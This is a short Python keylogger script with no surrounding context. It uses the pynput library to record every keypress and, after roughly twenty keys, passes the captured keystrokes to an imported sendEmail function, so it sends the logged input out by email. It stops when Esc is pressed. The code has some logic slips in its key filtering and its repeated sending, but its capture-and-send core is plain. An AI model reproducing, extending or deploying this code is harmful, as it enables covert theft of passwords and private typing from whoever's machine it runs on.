from send_mail import sendEmail
from pynput.keyboard import Key, Listener

count = 0
keys = []

def onPress(key):
  print(key, end=" pressed")
  global keys, count
  keys.append(str(key)+"\n")
  count += 1

  if count > 20:
    count = 0
    email(keys)

def email(keys):
  msg = ""
  for key in keys:
    k = key.replace("'", "")
    if key == "Key.space":
      k = " "
    elif key.find("Key") > 0:
      k = ""
    msg = msg + k
    sendEmail(msg)

def on_release(key):
  if key == Key.esc:
    return False

with Listener(on_press=onPress, on_release=on_release) as listener:
  listener.join()
